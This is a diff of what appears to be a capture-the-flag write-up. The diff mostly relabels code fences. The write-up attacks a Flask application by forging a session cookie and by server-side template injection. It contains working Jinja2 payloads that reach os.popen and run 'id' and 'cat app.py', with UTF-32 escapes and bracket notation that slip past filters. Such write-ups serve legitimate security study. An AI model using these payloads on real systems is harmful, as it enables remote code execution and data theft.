@@ -107,7 +107,7 @@ Connection: close
 
 - we noticed in the last response that the server sent a session, flask session 🤔hmm, did you think of what I thought, we can decode this session token using `flask-unsign` and brute force the secret to sign a new modified one. Easy, right?
     
-    ```html
+    ```http
     Set-Cookie: session=.eJyrVsosjk9Myc3MU7JKS8wpTtVRKi1OLYrPTFGyUjI0M1KC8PMSc1OBAhCFtQDj5xGP.ZM0uxw.Z1agEdPmnggokr26qAjRfzOkn9k; HttpOnly; Path=/
     ```
     
@@ -176,7 +176,7 @@ Connection: close
 - I found that the server blocks `__class__` but does not block its UTF-32, so I tough that we can use the following payload to get an RCE
 - we can use the following payload to get an RCE
     
-    ```bash
+    ```python
     ''.__class__.__mro__[1].__subclasses__()[207].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()
     ```
     
@@ -186,17 +186,25 @@ Connection: close
     
 - there is a problem, the server blocks `.`, don’t worry, we can bypass it using `[]`
 
-```bash
+```python
+
 {{''.__class__.__mro__[1].__subclasses__()[index_of_catch_warnings].__init__.__globals__['sys'].modules['os'].popen('echo RCE').read()}}
 {{''['__class__']['__mro__'][1]['__subclasses__'][index_of_catch_warnings]['__init__']['__globals__']['sys']['modules']['os']['popen']('id')['read']()}}
+
 ```
 
 ## finding `catch_warnings` index
 
-by sending ` {{''['__class__']['__mro__'][1]['__subclasses__']}} ` in UTF-32 like the following,
+by sending: 
+```python
+{{''['__class__']['__mro__'][1]['__subclasses__']}}
+``` 
+in UTF-32 like the following:
 
-```bash
+```python
+
 {{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()}}
+
 ```
 
  we will get a list of the subclasses, convert it from HTML entity and remove other HTML lines, and separate each class in a like in sublime (CTRL+F → `,`  and ALT+Enter then Enter), we can find that catch_warnings in line 208, decrementing it by one because python list counts from zero not one like sublime lines, `catch_warnings` index is 207
@@ -229,8 +237,10 @@ we will get
 
 final payload:
 
-```bash
+```python
+
 {{''['\U0000005F\U0000005F\U00000063\U0000006c\U00000061\U00000073\U00000073\U0000005F\U0000005F']['\U0000005f\U0000005f\U0000006d\U00000072\U0000006f\U0000005f\U0000005f'][1]['\U0000005f\U0000005f\U00000073\U00000075\U00000062\U00000063\U0000006c\U00000061\U00000073\U00000073\U00000065\U00000073\U0000005f\U0000005f']()[207]['\U0000005f\U0000005f\U00000069\U0000006e\U00000069\U00000074\U0000005f\U0000005f']['\U0000005f\U0000005f\U00000067\U0000006c\U0000006f\U00000062\U00000061\U0000006c\U00000073\U0000005f\U0000005f']['sys']['modules']['os']['\U00000070\U0000006f\U00000070\U00000065\U0000006e']('cat+app.py')['\U00000072\U00000065\U00000061\U00000064']()}}
+
 ```
 
 ---
